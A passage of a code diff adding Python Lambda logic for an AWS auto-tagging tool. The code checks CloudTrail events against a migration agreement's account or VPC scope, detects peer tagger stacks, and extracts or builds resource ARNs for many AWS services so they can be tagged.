+                          name = s.get('StackName', '')
+                          if name.startswith('StackSet-map-auto-tagger-mig'):
+                              peer_mpe = name[len('StackSet-map-auto-tagger-'):]
+                          elif name.startswith('map-auto-tagger-mig'):
+                              peer_mpe = name[len('map-auto-tagger-'):]
+                          else:
+                              continue
+                          if peer_mpe == own_mpe:
+                              continue
+                          peer_mpes.append(peer_mpe)
+                  if not peer_mpes:
+                      return
+                  print(
+                      f'PeerTaggerDetect: WARN — {len(peer_mpes)} peer tagger '
+                      f'stack(s) found in this account/region alongside '
+                      f'MpeId={own_mpe}: {peer_mpes}. Concurrent taggers race '
+                      f'on the same CloudTrail events; last-writer wins on '
+                      f'map-migrated tag value. See docs/ARCHITECTURE.md for '
+                      f'deterministic-routing status.'
+                  )
+                  try:
+                      cw = boto3.client('cloudwatch')
+                      cw.put_metric_data(
+                          Namespace='MapAutoTagger',
+                          MetricData=[
+                              *[
+                                  {
+                                      'MetricName': 'PeerTaggerDetected',
+                                      'Dimensions': [
+                                          {'Name': 'MpeId', 'Value': own_mpe},
+                                          {'Name': 'PeerMpeId', 'Value': peer},
+                                      ],
+                                      'Value': 1,
+                                      'Unit': 'Count',
+                                  }
+                                  for peer in peer_mpes
+                              ],
+                              {
+                                  'MetricName': 'PeerTaggerDetected',
+                                  'Dimensions': [
+                                      {'Name': 'MpeId', 'Value': own_mpe},
+                                  ],
+                                  'Value': len(peer_mpes),
+                                  'Unit': 'Count',
+                              },
+                          ],
+                      )
+                  except Exception as mx:
+                      print(f'PeerTaggerDetect: could not emit PeerTaggerDetected metric: {mx}')
+              except Exception as e:
+                  # Detector must never break cold start. Missing IAM
+                  # (cloudformation:ListStacks) or throttle means we skip
+                  # today and retry on next cold start.
+                  print(f'PeerTaggerDetect: detector skipped ({e})')
+
+          _detect_peer_taggers()
+
+          def get_account_from_arn(arn):
+              """Extract account ID from ARN."""
+              parts = arn.split(':')
+              return parts[4] if len(parts) > 4 else None
+
+          def ci_get(d, key):
+              """Case-insensitive dict lookup.
+
+              Handlers read CloudTrail responseElements / requestParameters fields
+              that AWS has historically emitted in inconsistent casing — older
+              services (Kendra, Redshift, Elastic Beanstalk) emit camelCase or
+              lowercase keys while handlers written against the boto3 SDK
+              response shape assumed PascalCase. §1.91 / §1.97 / §1.103 document
+              three live-confirmed silent-miss handlers.
+
+              Only use on 'responseElements' and 'requestParameters' — not on
+              fixed-shape keys we control. On a response that legitimately has
+              both 'Id' and 'id', this returns whichever sorts first by key
+              (stable across Python 3.7+ dict insertion order, so effectively
+              the one AWS emitted first).
+              """
+              if not isinstance(d, dict) or not d:
+                  return None
+              if key in d:
+                  return d[key]
+              lk = key.lower()
+              for k, v in d.items():
+                  if isinstance(k, str) and k.lower() == lk:
+                      return v
+              return None
+
+          def get_config():
+              global _config, _config_ts
+              now = time.time()
+              if _config is None or (now - _config_ts) > _CONFIG_TTL_SECONDS:
+                  try:
+                      resp = ssm.get_parameter(Name=os.environ['CONFIG_PARAM'])
+                      cfg = json.loads(resp['Parameter']['Value'])
+                  except Exception as e:
+                      # One SSM hiccup must not DLQ a burst. Fail closed: return a
+                      # safe-default config where mpe_id is None — is_in_scope()
+                      # hard-rejects that, so nothing tags until the next TTL
+                      # refresh succeeds.
+                      print(f'CONFIG_UNREACHABLE: {e}')
+                      return {
+                          'mpe_id': None,
+                          'scope_mode': 'account',
+                          'scoped_account_ids': ['ALL'],
+                          'scoped_vpc_ids': ['NONE'],
+                          'agreement_start_date': None,
+                      }
+                  # Whitespace strip for customer-edited SSM values. CFN
+                  # CommaDelimitedList strips on deploy; SSM-stored config may
+                  # carry customer-edit whitespace. Drop empties after strip.
+                  if isinstance(cfg.get('scoped_account_ids'), list):
+                      cfg['scoped_account_ids'] = [
+                          s.strip() for s in cfg['scoped_account_ids']
+                          if isinstance(s, str) and s.strip()
+                      ]
+                  if isinstance(cfg.get('scoped_vpc_ids'), list):
+                      cfg['scoped_vpc_ids'] = [
+                          s.strip() for s in cfg['scoped_vpc_ids']
+                          if isinstance(s, str) and s.strip()
+                      ]
+                  _config = cfg
+                  _config_ts = now
+              return _config
+
+          def is_after_agreement(config):
+              try:
+                  start = datetime.strptime(config.get('agreement_start_date'), '%Y-%m-%d').replace(tzinfo=timezone.utc)
+              except (ValueError, TypeError):
+                  print(f"Invalid agreement_start_date '{config.get('agreement_start_date')}', skipping event.")
+                  return False
+              now = datetime.now(timezone.utc)
+              if now < start:
+                  return False
+              end_str = config.get("agreement_end_date")
+              if end_str:
+                  try:
+                      end = datetime.strptime(end_str, "%Y-%m-%d").replace(tzinfo=timezone.utc)
+                      if now > end:
+                          print(f"Event after agreement_end_date {end_str}, skipping.")
+                          return False
+                  except (ValueError, TypeError):
+                      pass
+              return True
+
+          def is_in_scope(config, account_id, detail):
+              # Fail-closed guards (§1.3 / §1.129 class). Safe-default config
+              # from CONFIG_UNREACHABLE has mpe_id=None; if that ever happens
+              # elsewhere, the scope decision is also False.
+              if not config.get('mpe_id'):
+                  return False
+              asd = config.get('agreement_start_date')
+              try:
+                  datetime.strptime(asd, '%Y-%m-%d')
+              except (ValueError, TypeError):
+                  print(f"CONFIG_INVALID_AGREEMENT_DATE: '{asd}'")
+                  return False
+              mode = config['scope_mode']
+              if mode == 'account':
+                  scoped = config.get('scoped_account_ids', [])
+                  if isinstance(scoped, str):
+                      scoped = [s.strip() for s in scoped.split(',')]
+                  if 'ALL' in scoped:
+                      return True
+                  return account_id in scoped
+              if mode == 'vpc':
+                  scoped_vpcs = config.get('scoped_vpc_ids', [])
+                  if isinstance(scoped_vpcs, str):
+                      scoped_vpcs = [s.strip() for s in scoped_vpcs.split(',') if s.strip() and s.strip() != 'NONE']
+                  vpc_id = None
+                  resp_els = detail.get('responseElements') or {}
+                  if 'instanceId' in detail:
+                      try:
+                          resp = ec2.describe_instances(InstanceIds=[detail['instanceId']])
+                          vpc_id = resp['Reservations'][0]['Instances'][0].get('VpcId')
+                      except: pass
+                  elif resp_els.get('instancesSet', {}).get('items'):
+                      vpc_id = resp_els['instancesSet']['items'][0].get('vpcId')
+                  elif 'vpcId' in detail:
+                      vpc_id = detail['vpcId']
+                  elif resp_els.get('vpcId'):
+                      vpc_id = resp_els['vpcId']
+                  elif (detail.get('requestParameters') or {}).get('vpcId'):
+                      vpc_id = detail['requestParameters']['vpcId']
+                  elif 'volumeId' in detail:
+                      try:
+                          resp = ec2.describe_volumes(VolumeIds=[detail['volumeId']])
+                          attachments = resp['Volumes'][0].get('Attachments', [])
+                          if attachments:
+                              inst_id = attachments[0]['InstanceId']
+                              resp2 = ec2.describe_instances(InstanceIds=[inst_id])
+                              vpc_id = resp2['Reservations'][0]['Instances'][0].get('VpcId')
+                      except: pass
+                  if vpc_id and vpc_id in scoped_vpcs:
+                      return True
+                  if not vpc_id and config.get('tag_non_vpc_services'):
+                      _VPC_BOUND = {'ec2', 'elasticloadbalancing', 'rds', 'elasticache',
+                          'redshift', 'es', 'aoss', 'eks', 'ecs', 'elasticmapreduce', 'dax',
+                          'memorydb', 'neptune', 'mq', 'dms', 'elasticfilesystem', 'fsx',
+                          'kafka', 'msk', 'workspaces', 'ds', 'cloudhsm', 'cloudhsmv2'}
+                      svc = ''
+                      es = detail.get('eventSource', '')
+                      if es:
+                          svc = es.split('.')[0]
+                      else:
+                          arn = (resp_els.get('arn') or resp_els.get('Arn')
+                                 or resp_els.get('ARN') or '')
+                          if arn.count(':') >= 5:
+                              svc = arn.split(':')[2]
+                      if svc in _VPC_BOUND:
+                          return False
+                      return True
+                  return False
+              return False
+
+          def extract_arns_multi(detail, account_id, region):
+              """Return a list of ARNs for events that create multiple resources.
+
+              Used for events where AWS does NOT emit separate CloudTrail events
+              for each child resource. Returns None if the event is not one of
+              these; callers should fall back to single-ARN extract_arn.
+
+              RunInstances: the CloudTrail responseElements contains instance IDs
+              and the primary ENI, but the block-device-mapping is usually empty
+              — AWS populates the attached EBS volume IDs AFTER the instance
+              reaches pending/running, not in the RunInstances API response.
+              We therefore describe_instances to fetch the volume IDs.
+              """
+              event_name = detail.get('eventName', '')
+              if event_name != 'RunInstances':
+                  return None
+              resp = detail.get('responseElements') or {}
+              items = resp.get('instancesSet', {}).get('items') or []
+              if not items:
+                  return None
+              arns = []
+              # Gather instance IDs + any attached ENIs present in the event.
+              # Volumes come from describe_instances below.
+              inst_ids = []
+              for it in items:
+                  inst_id = it.get('instanceId')
+                  if inst_id:
+                      arns.append(f"arn:aws:ec2:{region}:{account_id}:instance/{inst_id}")
+                      inst_ids.append(inst_id)
+                  for ni in (it.get('networkInterfaceSet', {}) or {}).get('items') or []:
+                      ni_id = ni.get('networkInterfaceId')
+                      if ni_id:
+                          arns.append(f"arn:aws:ec2:{region}:{account_id}:network-interface/{ni_id}")
+
+              # Look up attached volume IDs via describe_instances. CloudTrail
+              # fires RunInstances milliseconds after the API call returns;
+              # volumes may not yet be attached. Poll briefly (up to 30s) for
+              # BlockDeviceMappings to populate. Every account has its own
+              # Lambda (StackSet architecture), so events are always processed
+              # in-account — no cross-account client needed.
+              if inst_ids:
+                  try:
+                      ec2_lookup = boto3.client('ec2', region_name=region)
+                      if ec2_lookup:
+                          deadline = time.time() + 30
+                          volume_ids = set()
+                          while time.time() < deadline:
+                              try:
+                                  desc = ec2_lookup.describe_instances(InstanceIds=inst_ids)
+                                  all_have_vols = True
+                                  volume_ids.clear()
+                                  for resv in desc.get('Reservations', []):
+                                      for inst in resv.get('Instances', []):
+                                          bdm = inst.get('BlockDeviceMappings', []) or []
+                                          if not bdm:
+                                              all_have_vols = False
+                                          for m in bdm:
+                                              vid = (m.get('Ebs') or {}).get('VolumeId')
+                                              if vid:
+                                                  volume_ids.add(vid)
+                                  if all_have_vols and volume_ids:
+                                      break
+                              except ClientError as e:
+                                  # Malformed instance IDs never resolve — no
+                                  # point burning the 30s budget. NotFound is
+                                  # different: the instance may still be
+                                  # materializing, so keep polling.
+                                  if e.response.get('Error', {}).get('Code') == 'InvalidInstanceID.Malformed':
+                                      raise
+                                  print(f'describe_instances poll: {e}')
+                              except Exception as e:
+                                  print(f'describe_instances poll: {e}')
+                              time.sleep(3)
+                          for vid in volume_ids:
+                              arns.append(f"arn:aws:ec2:{region}:{account_id}:volume/{vid}")
+                  except ClientError as e:
+                      # Let malformed-ID propagate so _classify_error routes
+                      # it to permanent_actionable instead of a silent log.
+                      if e.response.get('Error', {}).get('Code') == 'InvalidInstanceID.Malformed':
+                          raise
+                      print(f'Could not resolve RunInstances attached volumes: {e}')
+                  except Exception as e:
+                      print(f'Could not resolve RunInstances attached volumes: {e}')
+
+              return arns or None
+
+
+          def extract_arn(detail, account_id, region):
+              event_name = detail.get('eventName', '')
+              event_source = detail.get('eventSource', '')
+              resp = detail.get('responseElements') or {}
+              req = detail.get('requestParameters') or {}
+              resources = detail.get('resources', [])
+
+              # Handle early exceptions BEFORE universal pattern scan
+              # (prevents universal scan from picking up wrong ARNs)
+              # Bedrock Agent (nested: agent.agentArn)
+              if event_name == 'CreateAgent' and event_source == 'bedrock.amazonaws.com':
+                  agent_arn = resp.get('agent', {}).get('agentArn')
+                  if agent_arn:
+                      return agent_arn
+
+              # Bedrock Agent Action Group (no ARN in response — construct from IDs)
+              elif event_name == 'CreateAgentActionGroup' and event_source == 'bedrock.amazonaws.com':
+                  ag = resp.get('agentActionGroup', {})
+                  agent_id = ag.get('agentId')
+                  agent_ver = ag.get('agentVersion', 'DRAFT')
+                  ag_id = ag.get('actionGroupId')
+                  if agent_id and ag_id:
+                      return f"arn:aws:bedrock:{region}:{account_id}:agent/{agent_id}/agentversion/{agent_ver}/actiongroup/{ag_id}"
+
+              # Bedrock Agent Alias (nested: agentAlias.agentAliasArn)
+              elif event_name == 'CreateAgentAlias' and event_source == 'bedrock.amazonaws.com':
+                  alias_arn = resp.get('agentAlias', {}).get('agentAliasArn')
+                  if alias_arn:
+                      return alias_arn
+
+              # Bedrock Knowledge Base Data Source (no ARN in response — construct)
+              elif event_name == 'CreateDataSource' and event_source == 'bedrock.amazonaws.com':
+                  ds = resp.get('dataSource', {})
+                  kb_id = ds.get('knowledgeBaseId') or req.get('knowledgeBaseId')
+                  ds_id = ds.get('dataSourceId')
+                  if kb_id and ds_id:
+                      return f"arn:aws:bedrock:{region}:{account_id}:knowledge-base/{kb_id}/data-source/{ds_id}"
+
+              # (Lambda Layer handling removed — layers are not taggable per AWS
+              # Lambda TagResource API regex; PublishLayerVersion is in IGNORE_EVENTS
+              # at the handler level.)
+
+              # ECS Service — early exit to prevent clusterArn being picked up by universal scan
+              if event_name == 'CreateService' and event_source == 'ecs.amazonaws.com':
+                  svc_arn = resp.get('service', {}).get('serviceArn')
+                  if svc_arn:
+                      return svc_arn
+
+              elif event_name == 'CreateVpnConnection':
+                  vpn = resp.get('vpnConnection', {})
+                  vpn_id = vpn.get('vpnConnectionId')
+                  if vpn_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpn-connection/{vpn_id}"
+
+              elif event_name == 'CreatePlacementGroup':
+                  pg = resp.get('placementGroup', {})
+                  if not pg and 'CreatePlacementGroupResponse' in resp:
+                      pg = resp['CreatePlacementGroupResponse'].get('placementGroup', {})
+                  pg_id = pg.get('groupId')
+                  if pg_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:placement-group/{pg_id}"
+                  pg_arn = pg.get('groupArn')
+                  if pg_arn:
+                      return pg_arn
+
+              # Universal ARN patterns
+              arn_patterns = [
+                  'arn', 'Arn', 'ARN', 'resourceArn', 'ResourceArn', 'clusterArn', 'functionArn',
+                  'topicArn', 'tableArn', 'streamArn', 'stateMachineArn', 'pipelineArn',
+                  'backupVaultArn', 'dBInstanceArn', 'dBClusterArn', 'queueArn', 'loadBalancerArn',
+                  'eventBusArn', 'aRN', 'notebookInstanceArn', 'documentClassifierArn', 'applicationArn',
+                  'ApplicationARN', 'backupPlanArn', 'locationArn', 'computeEnvironmentArn', 'appArn',
+                  'groupARN', 'groupArn', 'activityArn', 'keyArn', 'serviceArn',
+                  'policyArn', 'replicationGroupArn',
+                  'modelArn', 'endpointArn', 'endpointConfigArn', 'trainingJobArn',
+                  'connectionArn', 'workgroupArn', 'namespaceArn',
+                  'clusterArn', 'nodeGroupArn', 'containerArn',
+                  'registryArn', 'imageArn', 'repositoryArn',
+                  'aliasArn', 'pipeArn', 'channelArn',
+                  'acceleratorArn', 'jobArn', 'firewallArn',
+                  'firewallPolicyArn', 'addonArn', 'userPoolArn',
+                  'guardrailArn', 'agentArn', 'knowledgeBaseArn',
+                  'flowArn', 'promptArn', 'promptVersionArn',
+                  # Bedrock sub-resources
+                  'agentAliasArn', 'dataSourceArn', 'provisionedModelArn',
+                  # Amazon MQ
+                  'BrokerArn', 'brokerArn',
+                  # AWS HealthLake
+                  'DatastoreArn', 'datastoreArn',
+                  # Amazon WorkSpaces Web
+                  'portalArn',
+                  # SageMaker Pipeline / Studio Domain / Feature Store
+                  'PipelineArn', 'DomainArn', 'FeatureGroupArn', 'featureGroupArn',
+                  # Service Catalog (nested in productViewDetail)
+                  'productARN',
+                  # IoT SiteWise
+                  'assetModelArn', 'assetArn', 'portalArn', 'gatewayArn',
+                  # IoT Analytics / Events
+                  'datasetArn', 'inputArn', 'detectorModelArn',
+                  # GameLift
+                  'buildArn', 'scriptArn', 'fleetArn',
+                  # Lookout services
+                  'ProjectArn', 'DatasetArn', 'AnomalyDetectorArn',
+                  # Shared ARN patterns (SageMaker, OpenSearch, etc.)
+                  'domainArn', 'instanceArn', 'applicationArn',
+                  # Amazon Omics
+                  'sequenceStoreArn', 'annotationStoreArn',
+                  # Elastic Beanstalk
+                  'ApplicationArn', 'EnvironmentArn',
+                  # MediaLive / MediaPackage / MediaStore
+                  'ChannelArn', 'OriginEndpointArn',
+              ]
+
+              # Try to find ARN in response
+              for pattern in arn_patterns:
+                  if pattern in resp and resp[pattern]:
+                      return resp[pattern]
+                  for key, val in resp.items():
+                      if isinstance(val, dict) and pattern in val and val[pattern]:
+                          return val[pattern]
+
+              # Suffix-match fallback (§1.31/§1.35/§1.56/§1.57/§1.61/§1.63 et al.).
+              # The hand-curated allowlist above misses ~46 ARN field names across
+              # new/less-common AWS services — every miss is a silent tag loss. This
+              # fallback catches any key ending in Arn/ARN/arn whose value is a
+              # string beginning with 'arn:'. Guards against false positives:
+              #   - val must start with 'arn:' (rejects plain IDs, names, dates)
+              #   - ARN's service segment must match the event source (rejects
+              #     related-resource ARNs like roleArn on a CreateFunction event
+              #     where functionArn — caught above — is the real subject)
+              # Ordering: Python dict iteration is insertion order (3.7+), and
+              # CloudTrail typically puts the subject-resource ARN earlier than
+              # related ARNs, so first match wins. Nested scan is 1-level only,
+              # matching the allowlist scan's depth.
+              event_svc_prefix = event_source.split('.')[0].replace('aws.', '').lower()
+              def _maybe_arn(k, v):
+                  if not isinstance(v, str) or not v.startswith('arn:'):
+                      return None
+                  if not (k.endswith('Arn') or k.endswith('ARN') or k.endswith('arn')):
+                      return None
+                  # arn:aws:<service>:<region>:<acct>:<resource>
+                  parts = v.split(':', 5)
+                  if len(parts) < 6:
+                      return None
+                  arn_svc = parts[2].lower()
+                  # Allow common cross-service subject-ARN patterns (e.g. ec2
+                  # events that produce elasticloadbalancing ARNs are rare,
+                  # but event-source-to-ARN-service isn't a strict 1:1 map).
+                  # Accept either an exact prefix match or a well-known alias.
+                  if arn_svc == event_svc_prefix:
+                      return v
+                  aliases = {
+                      'elasticloadbalancing': ('elbv2', 'elb', 'elasticloadbalancing'),
+                      'route53': ('route53', 'route53domains', 'route53resolver'),
+                      'apigateway': ('apigateway',),
+                      'bedrock': ('bedrock', 'bedrock-agent', 'bedrock-runtime'),
+                      'kinesis': ('kinesis', 'kinesisvideo', 'kinesisanalytics', 'firehose'),
+                      'rds': ('rds', 'neptune', 'docdb'),
+                      'sagemaker': ('sagemaker',),
+                      'iot': ('iot', 'iotanalytics', 'iotevents', 'iotsitewise'),
+                  }
+                  if arn_svc in aliases.get(event_svc_prefix, ()):
+                      return v
+                  return None
+              for key, val in resp.items():
+                  m = _maybe_arn(key, val)
+                  if m:
+                      return m
+                  if isinstance(val, dict):
+                      for nk, nv in val.items():
+                          m = _maybe_arn(nk, nv)
+                          if m:
+                              return m
+
+              # Glue Table - must be before resources array check to avoid returning database ARN
+              # (Glue CreateTable CloudTrail resources array contains database ARN first)
+              if event_name == 'CreateTable' and event_source == 'glue.amazonaws.com':
+                  db_name = req.get('databaseName')
+                  tbl_name = req.get('tableInput', {}).get('name')
+                  if db_name and tbl_name:
+                      return f"arn:aws:glue:{region}:{account_id}:table/{db_name}/{tbl_name}"
+
+              # Check resources array (used by some services like Keyspaces)
+              # Skip catalog ARNs for Glue (use database ARN instead)
+              if resources and len(resources) > 0:
+                  for resource in resources:
+                      arn = resource.get('ARN')
+                      # Skip Glue catalog ARNs - we want the database/table ARN
+                      if arn and ':catalog' not in arn:
+                          return arn
+
+              # Construct ARNs for specific services
+              service = event_source.split('.')[0].replace('aws.', '')
+
+              if event_name == 'RunInstances':
+                  # RunInstances is handled via extract_arns_multi (called from
+                  # the handler) because it emits multiple resources: all instance
+                  # IDs, all attached EBS volume IDs, and all attached ENI IDs.
+                  # AWS does NOT emit separate CreateVolume / CreateNetworkInterface
+                  # CloudTrail events for resources born inline with RunInstances,
+                  # so we must extract them from the RunInstances event itself.
+                  # Returning the first instance ARN here preserves backward
+                  # compatibility if this single-ARN path is hit (should not be
+                  # for RunInstances — the handler calls extract_arns_multi first).
+                  items = resp.get('instancesSet', {}).get('items', [])
+                  if items:
+                      return f"arn:aws:ec2:{region}:{account_id}:instance/{items[0].get('instanceId')}"
+              elif event_name == 'CreateVolume':
+                  vol_id = resp.get('volumeId')
+                  return f"arn:aws:ec2:{region}:{account_id}:volume/{vol_id}" if vol_id else None
+              elif event_name == 'CreateBucket':
+                  bucket = req.get('bucketName')
+                  return f"arn:aws:s3:::{bucket}" if bucket else None
+              elif event_name == 'CreateStream' and event_source == 'kinesis.amazonaws.com':
+                  # Exact match — ''kinesis' in service' also matched
+                  # kinesisvideo.amazonaws.com and produced a broken
+                  # arn:aws:kinesis:... ARN for KVS streams. KVS has its
+                  # own handler (look further down for kinesisvideo).
+                  name = req.get('streamName')
+                  return f"arn:aws:kinesis:{region}:{account_id}:stream/{name}" if name else None
+              elif event_name == 'CreateDeliveryStream':
+                  name = req.get('deliveryStreamName')
+                  return f"arn:aws:firehose:{region}:{account_id}:deliverystream/{name}" if name else None
+              elif event_name == 'CreateAutoScalingGroup':
+                  name = req.get('autoScalingGroupName')
+                  return f"arn:aws:autoscaling:{region}:{account_id}:autoScalingGroup:*:autoScalingGroupName/{name}" if name else None
+              elif event_name == 'CreateLogGroup':
+                  name = req.get('logGroupName')
+                  return f"arn:aws:logs:{region}:{account_id}:log-group:{name}" if name else None
+              elif event_name in ['CreateRestApi', 'CreateApi']:
+                  api_id = resp.get('id') or resp.get('apiId')
+                  api_type = 'restapis' if event_name == 'CreateRestApi' else 'apis'
+                  return f"arn:aws:apigateway:{region}::/{api_type}/{api_id}" if api_id else None
+              elif event_name == 'CreateQueue' and event_source == 'sqs.amazonaws.com':
+                  # SQS returns URL, need to construct ARN
+                  queue_url = resp.get('queueUrl')
+                  if queue_url:
+                      queue_name = queue_url.split('/')[-1]
+                      return f"arn:aws:sqs:{region}:{account_id}:{queue_name}"
+
+              # EC2 Resources (use resource IDs to construct ARNs)
+              elif event_name == 'CreateVpc':
+                  vpc = resp.get('vpc', {})
+                  vpc_id = vpc.get('vpcId')
+                  if vpc_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpc/{vpc_id}"
+              elif event_name == 'CreateSecurityGroup':
+                  group_id = resp.get('groupId')
+                  if group_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:security-group/{group_id}"
+              elif event_name == 'CreateNetworkInterface':
+                  eni = resp.get('networkInterface', {})
+                  eni_id = eni.get('networkInterfaceId')
+                  if eni_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:network-interface/{eni_id}"
+              elif event_name == 'CreateSubnet':
+                  subnet = resp.get('subnet', {})
+                  subnet_id = subnet.get('subnetId')
+                  if subnet_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:subnet/{subnet_id}"
+              elif event_name == 'CreateInternetGateway':
+                  igw = resp.get('internetGateway', {})
+                  igw_id = igw.get('internetGatewayId')
+                  if igw_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:internet-gateway/{igw_id}"
+              elif event_name == 'AllocateAddress':
+                  alloc_id = resp.get('allocationId')
+                  if alloc_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:elastic-ip/{alloc_id}"
+
+              # Egress-only Internet Gateway
+              elif event_name == 'CreateEgressOnlyInternetGateway':
+                  eigw = resp.get('egressOnlyInternetGateway', {})
+                  if not eigw and 'CreateEgressOnlyInternetGatewayResponse' in resp:
+                      eigw = resp['CreateEgressOnlyInternetGatewayResponse'].get('egressOnlyInternetGateway', {})
+                  eigw_id = eigw.get('egressOnlyInternetGatewayId')
+                  if eigw_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:egress-only-internet-gateway/{eigw_id}"
+
+              # Customer Gateway
+              elif event_name == 'CreateCustomerGateway':
+                  cgw = resp.get('customerGateway', {})
+                  if not cgw and 'CreateCustomerGatewayResponse' in resp:
+                      cgw = resp['CreateCustomerGatewayResponse'].get('customerGateway', {})
+                  cgw_id = cgw.get('customerGatewayId')
+                  if cgw_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:customer-gateway/{cgw_id}"
+
+              # Network ACL
+              elif event_name == 'CreateNetworkAcl':
+                  acl = resp.get('networkAcl', {})
+                  if not acl and 'CreateNetworkAclResponse' in resp:
+                      acl = resp['CreateNetworkAclResponse'].get('networkAcl', {})
+                  acl_id = acl.get('networkAclId')
+                  if acl_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:network-acl/{acl_id}"
+
+              # NAT Gateway (§1.50 — CloudTrail EC2 responses wrap in
+              # <EventName>Response; match the unwrap pattern used by
+              # CreateNetworkAcl / CreateLaunchTemplate / CreateTransitGateway /
+              # CreateVpnGateway / CreateRouteTable above.)
+              elif event_name == 'CreateNatGateway':
+                  nat = resp.get('natGateway', {})
+                  if not nat and 'CreateNatGatewayResponse' in resp:
+                      nat = resp['CreateNatGatewayResponse'].get('natGateway', {})
+                  nat_id = nat.get('natGatewayId')
+                  if nat_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:natgateway/{nat_id}"
+
+              # Simple ARN Extractions
+              elif event_name == 'CreateRepository' and event_source == 'ecr.amazonaws.com':
+                  repo = resp.get('repository', {})
+                  arn = repo.get('repositoryArn')
+                  return arn
+              elif event_name == 'CreateFileSystem' and event_source == 'elasticfilesystem.amazonaws.com':
+                  return resp.get('fileSystemArn')
+              elif event_name == 'CreateFileSystem' and event_source == 'fsx.amazonaws.com':
+                  fs = resp.get('fileSystem', {})
+                  return fs.get('resourceARN')
+              elif event_name == 'PutRule':
+                  rule_arn = resp.get('ruleArn')
+                  return rule_arn
+              elif event_name == 'CreateStack':
+                  stack_id = resp.get('stackId')
+                  return stack_id
+              elif event_name == 'CreateStackSet':
+                  stackset_id = resp.get('stackSetId')
+                  if stackset_id:
+                      # StackSet ID format: name:uuid
+                      return f"arn:aws:cloudformation:{region}:{account_id}:stackset/{stackset_id}"
+              elif event_name == 'CreateLaunchTemplate':
+                  # CloudTrail wraps EC2 responses in <EventName>Response
+                  template = resp.get('launchTemplate', {})
+                  if not template and 'CreateLaunchTemplateResponse' in resp:
+                      template = resp['CreateLaunchTemplateResponse'].get('launchTemplate', {})
+                  template_id = template.get('launchTemplateId')
+                  if template_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:launch-template/{template_id}"
+
+              # CloudWatch Alarms
+              elif event_name == 'PutMetricAlarm':
+                  alarm_name = req.get('alarmName')
+                  if alarm_name:
+                      return f"arn:aws:cloudwatch:{region}:{account_id}:alarm:{alarm_name}"
+
+              # SSM Parameters — name may or may not have a leading "/".
+              # Valid ARN is always "parameter/<name>"; normalize to exactly one "/".
+              elif event_name == 'PutParameter':
+                  param_name = req.get('name')
+                  if param_name:
+                      return f"arn:aws:ssm:{region}:{account_id}:parameter/{param_name.lstrip('/')}"
+
+              # ACM Certificates
+              elif event_name == 'RequestCertificate':
+                  cert_arn = resp.get('certificateArn')
+                  return cert_arn
+
+              # Transit Gateway (EC2 response wrapper)
+              elif event_name == 'CreateTransitGateway':
+                  tgw = resp.get('transitGateway', {})
+                  if not tgw and 'CreateTransitGatewayResponse' in resp:
+                      tgw = resp['CreateTransitGatewayResponse'].get('transitGateway', {})
+                  tgw_id = tgw.get('transitGatewayId')
+                  if tgw_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:transit-gateway/{tgw_id}"
+
+              # VPN Gateway (EC2 response wrapper)
+              elif event_name == 'CreateVpnGateway':
+                  vpn = resp.get('vpnGateway', {})
+                  if not vpn and 'CreateVpnGatewayResponse' in resp:
+                      vpn = resp['CreateVpnGatewayResponse'].get('vpnGateway', {})
+                  vpn_id = vpn.get('vpnGatewayId')
+                  if vpn_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpn-gateway/{vpn_id}"
+
+              # Route Table
+              elif event_name == 'CreateRouteTable':
+                  rt = resp.get('routeTable', {})
+                  if not rt and 'CreateRouteTableResponse' in resp:
+                      rt = resp['CreateRouteTableResponse'].get('routeTable', {})
+                  rt_id = rt.get('routeTableId')
+                  if rt_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:route-table/{rt_id}"
+
+              # Glue Job
+              elif event_name == 'CreateJob':
+                  job_name = req.get('name')
+                  if job_name:
+                      return f"arn:aws:glue:{region}:{account_id}:job/{job_name}"
+
+              # Load Balancer — ELBv1 Classic AND ELBv2 (ALB/NLB/GWLB) share
+              # eventSource='elasticloadbalancing.amazonaws.com'. They're
+              # disambiguated only by response shape:
+              #   ELBv2: responseElements.loadBalancers[].loadBalancerArn
+              #   ELBv1 Classic: responseElements.dNSName (no ARN); name in request
+              elif event_name == 'CreateLoadBalancer' and event_source == 'elasticloadbalancing.amazonaws.com':
+                  lbs = resp.get('loadBalancers', [])
+                  if lbs and len(lbs) > 0:
+                      # ELBv2 path
+                      return lbs[0].get('loadBalancerArn')
+                  # ELBv1 Classic path — construct ARN from request name
+                  lb_name = req.get('loadBalancerName')
+                  if lb_name:
+                      return f"arn:aws:elasticloadbalancing:{region}:{account_id}:loadbalancer/{lb_name}"
+
+              # Database Clusters
+              elif event_name == 'CreateDBCluster':
+                  cluster = resp.get('dBCluster', {})
+                  return cluster.get('dBClusterArn')
+              elif event_name == 'CreateCluster' and event_source == 'redshift.amazonaws.com':
+                  # §1.91 — CloudTrail casing for Redshift response fields has
+                  # varied across eventVersion revisions ('clusterIdentifier' vs
+                  # 'ClusterIdentifier'). ci_get handles both.
+                  cluster_id = ci_get(resp, 'clusterIdentifier')
+                  if cluster_id:
+                      return f"arn:aws:redshift:{region}:{account_id}:cluster:{cluster_id}"
+              elif event_name == 'CreateCluster' and event_source == 'memorydb.amazonaws.com':
+                  cluster = resp.get('cluster', {})
+                  return cluster.get('aRN')  # Note: capital ARN
+
+              # CloudHSM v2 Cluster — responseElements has no ARN, only cluster.clusterId.
+              # §1.99b: CloudTrail eventSource for CloudHSM v2 is 'cloudhsm.amazonaws.com'
+              # (NOT 'cloudhsmv2.amazonaws.com'). The boto3 service name IS 'cloudhsmv2';
+              # only the CloudTrail eventSource differs. Live-confirmed 2026-04-27.
+              elif event_name == 'CreateCluster' and event_source == 'cloudhsm.amazonaws.com':
+                  cluster_id = (resp.get('cluster') or {}).get('clusterId')
+                  if cluster_id:
